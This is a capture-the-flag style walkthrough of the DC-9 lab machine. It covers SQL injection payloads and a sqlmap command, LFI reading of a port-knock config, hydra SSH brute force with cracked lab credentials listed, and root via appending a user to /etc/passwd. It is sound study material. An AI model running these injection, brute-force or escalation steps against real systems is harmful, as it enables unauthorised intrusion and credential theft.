# DC-9



## nmap

![image-20200816162854260](DC-9.assets/image-20200816162854260.png)

#### ip

```
192.168.167.133
```



#### enumeration

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome

only http is open





## httpEnumeration

search box is vulnerable to sqlinjection

![image-20200816164636618](DC-9.assets/image-20200816164636618.png)





#### sql injection

manually inserted some sql quiries to get see if there is sql injection

````
' or 1=1 -- -
````

![image-20200816164738365](DC-9.assets/image-20200816164738365.png)



enumerating version 

```
' or 1 = 1 union select @@version,2,3,4,5,6
```



![image-20200816164835679](DC-9.assets/image-20200816164835679.png)



#### sqlmap

- using sqlmap to get all the details
- copy the contents of request
- and pass it to sqlmap with -r flag

![image-20200816165105902](DC-9.assets/image-20200816165105902.png)



- sqlmap -r to give the post req.
- --dbs to identify backend dbms.
- --batch to not prompt for any user input and automate the task entirely.

```
sqlmap -r req --dbs --batch
```



![image-20200816170601062](DC-9.assets/image-20200816170601062.png)



- there are 3 databses 
- backend is running MySQL

##### staff

dumping details of database staff and users

![image-20200816170849816](DC-9.assets/image-20200816170849816.png)

![image-20200816170943328](/home/manish/.config/Typora/typora-user-images/image-20200816170943328.png)

##### users table

![image-20200816171023236](DC-9.assets/image-20200816171023236.png)



## hash cracking 

lets crack password of admin user

hashcat did not gave any result

tried crackstation and got  the credentials

![image-20200816171349668](DC-9.assets/image-20200816171349668.png)



#### credentials

admin		transorbital1



## httpEnumeration



logging in with the credentials

we got a local file inclusion with manage.php

![image-20200816172428550](DC-9.assets/image-20200816172428550.png)



#### port knock

````
port knocking sequence at /etc/knockd.conf
````



![image-20200816172557527](DC-9.assets/image-20200816172557527.png)



```
sequence 	7469, 8475, 9842
```



before port knocking

![image-20200816173050601](DC-9.assets/image-20200816173050601.png)



after port knocking

![image-20200816173111036](DC-9.assets/image-20200816173111036.png)



## exploit



#### hydra



lets brute force the password and id we got from Users database

![image-20200816173759062](DC-9.assets/image-20200816173759062.png)

```
[22][ssh] host: 192.168.167.133   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.167.133   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.167.133   login: janitor   password: Ilovepeepee
```



## post



#### enumeration

found new credentials in user janitors account

![image-20200816174304111](DC-9.assets/image-20200816174304111.png)



#### hydra

using hydra to bruteforce with these credentials

![image-20200816174649375](DC-9.assets/image-20200816174649375.png)

found 2 valid credentials



#### fredf

this user can run following command with no password

![image-20200816174742198](DC-9.assets/image-20200816174742198.png)



this code is getting a file and appending it to another

![image-20200816175319155](DC-9.assets/image-20200816175319155.png)



we can create a new user and append it to /etc/passwd with root privileges

![image-20200816175917349](DC-9.assets/image-20200816175917349.png)



## root

![image-20200816180019910](DC-9.assets/image-20200816180019910.png)